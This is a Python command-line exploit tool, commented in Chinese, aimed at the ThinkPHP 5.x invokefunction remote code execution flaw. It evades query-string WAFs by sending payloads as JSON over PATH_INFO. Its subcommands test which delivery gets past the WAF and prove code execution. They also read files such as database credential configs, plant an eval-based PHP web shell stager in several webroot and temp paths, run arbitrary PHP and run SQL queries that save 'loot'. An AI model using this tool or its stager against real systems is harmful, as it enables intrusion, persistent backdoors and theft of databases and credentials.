#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""tp5-gadget.py — ThinkPHP 5.0/5.1 `invokefunction` 请求器(JSON body + PATH_INFO 形态)

用途:绕「只看 URI + 查询串」的 WAF(宝塔/nginx 层关键词拦截)。仅对授权目标使用。

核心认知(三发相同的原语,只有投递形态不同):
    A 查询串路由   GET  /index.php?s=/index/\\think\\app/invokefunction&function=..   -> 常被 WAF 拦
    B PATH_INFO    POST /index.php/index/think\\app/invokefunction  + form fields
    C PATH_INFO    POST /index.php/index/think\\app/invokefunction  + JSON body        <- 首选

命令(先跑 forms):
    forms    三形态对照实验(判 WAF 在看哪一层,不靠猜)
    probe    任意函数调用证明 RCE
    put      file_put_contents 落地任意内容(路径必须绝对,来自 debug 页/邻段站)
    inc      think\\__include_file 执行落地文件(**免 .php 壳**)
    read     读任意文件(highlight_file 直出 / file_get_contents 回显)
    deploy   落地 stager 到多副本(public / 站点根 / runtime/temp / /tmp)
    run      任意 PHP 执行(两发:body 写代码 → include;payload 全在 body,绝不进查询串)
    sql      跑 SQL(DSN 从 application/database.php 取,明文走 POST)

例子:
  python tp5-gadget.py forms --url 'http://T/index.php/index/think\\app/invokefunction'
  python tp5-gadget.py deploy --url '...' --webroot /www/wwwroot/t.cc
  python tp5-gadget.py run --url '...' --stager /www/wwwroot/t.cc/public/x.txt \\
        --code "var_dump(phpversion());"
  python tp5-gadget.py read --url '...' --file application/database.php
  python tp5-gadget.py sql  --url '...' --stager /www/wwwroot/t.cc/public/x.txt \\
        --dsn 'mysql:host=localhost;dbname=t;charset=utf8mb4' --user U --pass P \\
        --query 'show tables' --save loot/tables.json

注:全局选项(--limit/--save/--proxy/--stager/--cmdname/--timeout/--enc5c)写在子命令前或后均可。
注:Windows 上 --save 的路径请写原生形式(D:/loot/x.json);`/tmp/x` 会被当成"当前盘根下的 \\tmp\\x"。
验证状态:已对一个本地 PHP 8.3.9 的 TP5 模拟器(带宝塔同款「只查查询串」WAF)跑通
          forms/probe/put/inc/deploy/run/read/sql 全部子命令,含 disable_functions 报错语义与散落 .php 404。
"""
import argparse
import json
import os
import posixpath
import sys
import urllib.error
import urllib.parse
import urllib.request

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
WAF_MARKERS = ["拦截", "防火牆", "防火墙", "不合法", "安全狗", "云锁", "x-waf", "Blocked", "Forbidden"]

# stager:优先 $_REQUEST(短参直调),否则 eval 同级 cmd 文件(长 payload/含 SQL 明文走这里)
STAGER = """<?php
$b=dirname(__FILE__);$f=$b.'/{CMDFILE}';
$c=isset($_REQUEST['c'])?$_REQUEST['c']:'';
$d=isset($_REQUEST['d'])?$_REQUEST['d']:'';
if($c!==''){
 if($c==='read'){echo @file_get_contents($d);}
 elseif(function_exists($c)){$r=@$c($d);if($r!==null&&!is_bool($r)){echo is_scalar($r)?$r:json_encode($r,320);}}
 else{@eval($d);}
}elseif(is_file($f)){@eval(file_get_contents($f));}
"""


def http(url, body=None, ctype=None, method=None, timeout=25, proxy=None, headers=None):
    hdrs = {"User-Agent": UA}
    if ctype:
        hdrs["Content-Type"] = ctype
    if headers:
        hdrs.update(headers)
    data = body.encode("utf-8", "surrogateescape") if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method or ("POST" if data is not None else "GET"))
    opener = urllib.request.build_opener()
    if proxy:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:  # 连接失败/超时/证书
        return 0, ("ERR: %s" % e).encode()


def classify(status, text):
    """拦截页判定必须收窄:读文件(highlight_file)的输出里也会出现“拦截/防火墙”字样,别误判成 WAF。"""
    if status == 0:
        return "CONN-ERR"
    low = text[:2000]
    hit = any(m in low for m in WAF_MARKERS)
    html = low.lstrip()[:200].lower().startswith(("<html", "<!doctype", "<meta", "<head", "<script"))
    if hit and len(text) < 4096 and (status in (403, 406, 400) or html):
        return "WAF/拦截页"
    if status == 404:
        return "404(路由/文件不存在)"
    if status == 403:
        return "403(非拦截页则看权限)"
    if status == 200:
        return "200(已到应用/源站)"
    return str(status)


def show(label, status, body, limit=1400, save=None):
    text = body.decode("utf-8", "replace")
    print("[%s] HTTP %s len=%d class=%s" % (label, status, len(body), classify(status, text)))
    print(text[:limit])
    if save:
        os.makedirs(os.path.dirname(save) or ".", exist_ok=True)
        with open(save, "wb") as fh:
            fh.write(body)
        print("-> saved %s (%d bytes)" % (save, len(body)))
    return text


def site_base(shell):
    for marker in ("/index.php", "/public/index.php"):
        if marker in shell:
            return shell.split(marker)[0]
    return shell.rstrip("/")


def gadget(a, func, vars_=None, qs=None, extra=None):
    """C 形态: PATH_INFO 路由 + JSON body。qs 为额外查询串(k=v&k2=v2)。"""
    url = a.url.replace("\\", "%5C") if a.enc5c else a.url
    if qs:
        url += ("&" if "?" in url else "?") + qs
    payload = {"function": func, "vars": list(vars_ or [])}
    if extra:
        payload.update(extra)
    return http(url, json.dumps(payload, ensure_ascii=False), "application/json",
                timeout=a.timeout, proxy=a.proxy)


def q(**kw):
    return urllib.parse.urlencode(kw, quote_via=urllib.parse.quote)


# ---------------------------------------------------------------- 子命令

def cmd_forms(a):
    """三形态对照:同一 payload,三种投递;只有拿到三行结果才能判 WAF 在看哪一层。"""
    base = site_base(a.url)
    p = "call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
    rows = []
    st, bd = http(base + "/index.php?s=/index/\\think\\app/invokefunction&" + p,
                  timeout=a.timeout, proxy=a.proxy)
    rows.append(("A 查询串路由", st, classify(st, bd.decode('utf-8', 'replace'))))
    st, bd = http(a.url.replace("\\", "%5C") if a.enc5c else a.url,
                  "function=" + p, "application/x-www-form-urlencoded",
                  timeout=a.timeout, proxy=a.proxy)
    rows.append(("B PATH_INFO+form", st, classify(st, bd.decode('utf-8', 'replace'))))
    st, bd = gadget(a, "call_user_func_array", ["phpinfo", [-1]])
    rows.append(("C PATH_INFO+JSON", st, classify(st, bd.decode('utf-8', 'replace'))))
    print("%-20s %-6s %s" % ("形态", "HTTP", "类别"))
    for name, st, kind in rows:
        print("%-20s %-6s %s" % (name, st, kind))
    ok = [n for n, st, kind in rows if st == 200 and "WAF" not in kind]
    print("\n可用形态: %s" % (", ".join(ok) if ok else "全部被拦 -> 试 --enc5c / 换类名 / 走 cloud-waf-rule-bypass"))
    return 0


def cmd_probe(a):
    st, bd = gadget(a, a.func, [a.arg] if a.arg else [])
    show("probe", st, bd, save=a.save)
    return 0


def cmd_put(a):
    content = a.data
    if a.data_file:
        with open(a.data_file, "r", encoding="utf-8") as fh:
            content = fh.read()
    st, bd = gadget(a, "file_put_contents", [a.path, content, 0, None])
    show("put %s" % a.path, st, bd, save=a.save)
    return 0


def cmd_inc(a):
    st, bd = gadget(a, "think\\__include_file", [a.path], qs=a.q)
    show("inc %s" % a.path, st, bd, save=a.save)
    return 0


def cmd_read(a):
    st, bd = gadget(a, "highlight_file" if a.hl else "file_get_contents", [a.file])
    show("read %s" % a.file, st, bd, limit=a.limit, save=a.save)
    return 0


def cmd_deploy(a):
    name = a.name
    cmdfile = a.cmdname
    body = STAGER.replace("{CMDFILE}", cmdfile)
    webroot = a.webroot.rstrip("/")
    targets = a.target or [
        "%s/public/%s" % (webroot, name),
        "%s/%s" % (webroot, name),
        "%s/runtime/temp/%s" % (webroot, name),
        "/tmp/%s" % name,
    ]
    print("stager cmd 文件(同级): %s\n" % cmdfile)
    for t in targets:
        st, bd = gadget(a, "file_put_contents", [t, body, 0, None])
        text = bd.decode("utf-8", "replace")
        ok = "OK" if (st == 200 and "WAF" not in classify(st, text) and text.strip() in ("", str(len(body)))) else "?"
        print("[%s] %-6s %s  len=%d  %s" % (ok, st, t, len(body), text[:120].replace("\n", " ")))
    print("\n验证: python %s inc --url '<shell>' --path %s --q 'c=var_dump&d=STAGER-OK'"
          % (sys.argv[0], targets[0]))
    return 0


def _run(a, code, label="run"):
    stager = a.stager
    cmdpath = posixpath.join(posixpath.dirname(stager), a.cmdname)
    st, bd = gadget(a, "file_put_contents", [cmdpath, code, 0, None])
    if st != 200:
        show(label + "(write cmd)", st, bd, save=a.save)
        return 1
    st, bd = gadget(a, "think\\__include_file", [stager])
    return show(label + "(exec)", st, bd, limit=a.limit, save=a.save)


def cmd_run(a):
    code = a.code
    if a.code_file:
        with open(a.code_file, "r", encoding="utf-8") as fh:
            code = fh.read()
    _run(a, code)
    return 0


def cmd_sql(a):
    def esc(s):
        return s.replace("\\", "\\\\").replace("'", "\\'")
    code = ("$p=new PDO('%s','%s','%s');$s=$p->query('%s');"
            "echo json_encode($s?$s->fetchAll(PDO::FETCH_ASSOC):null,320);"
            % (esc(a.dsn), esc(a.user), esc(a.pwd), esc(a.query)))
    if a.save:
        print("SQL: %s" % a.query)
    _run(a, code, label="sql")
    return 0


# ---------------------------------------------------------------- CLI

def main():
    ap = argparse.ArgumentParser(description="TP5 invokefunction 请求器(JSON body + PATH_INFO)")
    ap.add_argument("--url", required=True,
                    help=r"e.g. http://T/index.php/index/think\app/invokefunction (反斜杠用 \\ 或单引号)")
    ap.add_argument("--timeout", type=int, default=25)
    ap.add_argument("--proxy", help="http proxy, e.g. http://127.0.0.1:10808 (SOCKS 用 ssh -D)")
    ap.add_argument("--enc5c", action="store_true", help="把路由里的反斜杠发成 %%5C(部分客户端/nginx 需要)")
    ap.add_argument("--save", help="把响应体存盘(全量证据)")
    ap.add_argument("--limit", type=int, default=1400, help="终端最多打印多少字符(保护上下文)")
    ap.add_argument("--stager", default="/www/wwwroot/site/public/x.txt", help="stager 绝对路径(run/sql 用)")
    ap.add_argument("--cmdname", default=".xcmd.txt", help="stager 同级 cmd 文件名")
    sub = ap.add_subparsers(dest="cmd", required=True)

    sp = sub.add_parser("forms", help="三形态对照实验")
    sp.set_defaults(fn=cmd_forms)

    sp = sub.add_parser("probe", help="任意函数调用证明 RCE")
    sp.add_argument("--func", default="var_dump")
    sp.add_argument("--arg", default="GETSHELLOK")
    sp.set_defaults(fn=cmd_probe)

    sp = sub.add_parser("put", help="file_put_contents 落地文件")
    sp.add_argument("--path", required=True)
    sp.add_argument("--data", default="")
    sp.add_argument("--data-file")
    sp.set_defaults(fn=cmd_put)

    sp = sub.add_parser("inc", help="include_file 执行落地文件(免 .php)")
    sp.add_argument("--path", required=True)
    sp.add_argument("--q", default="", help="传给 stager 的查询串, e.g. 'c=var_dump&d=OK'")
    sp.set_defaults(fn=cmd_inc)

    sp = sub.add_parser("read", help="读文件看源码(DSN 从这里来)")
    sp.add_argument("--file", required=True, help="绝对路径, 如 /www/wwwroot/t/application/database.php")
    sp.add_argument("--hl", action="store_true", help="用 highlight_file(直出, 更稳)")
    sp.set_defaults(fn=cmd_read)

    sp = sub.add_parser("deploy", help="落地 stager 多副本")
    sp.add_argument("--webroot", required=True, help="站点根, 如 /www/wwwroot/t.cc")
    sp.add_argument("--name", default="x.txt")
    sp.add_argument("--target", action="append", help="自定义落地路径(可多次)")
    sp.set_defaults(fn=cmd_deploy)

    sp = sub.add_parser("run", help="任意 PHP 执行(payload 全在 body)")
    sp.add_argument("--code", default="", help="不含 <?php 的 PHP 代码")
    sp.add_argument("--code-file", help="从本地文件读代码")
    sp.set_defaults(fn=cmd_run)

    sp = sub.add_parser("sql", help="跑 SQL(建议先 sql --query 'show tables')")
    sp.add_argument("--dsn", required=True, help="mysql:host=localhost;dbname=X;charset=utf8mb4")
    sp.add_argument("--user", required=True)
    sp.add_argument("--pass", dest="pwd", default="")
    sp.add_argument("--query", required=True)
    sp.set_defaults(fn=cmd_sql)

    # 全局选项也允许写在子命令之后:子解析器用 SUPPRESS 默认值,未提供时不会覆盖全局值
    common = [
        ("--timeout", {"type": int}), ("--proxy", {}), ("--save", {}), ("--limit", {"type": int}),
        ("--enc5c", {"action": "store_true"}), ("--stager", {}), ("--cmdname", {}),
    ]
    for sp in sub.choices.values():
        for flag, kw in common:
            sp.add_argument(flag, **dict(kw, default=argparse.SUPPRESS))

    a = ap.parse_args()
    return a.fn(a)


if __name__ == "__main__":
    sys.exit(main())
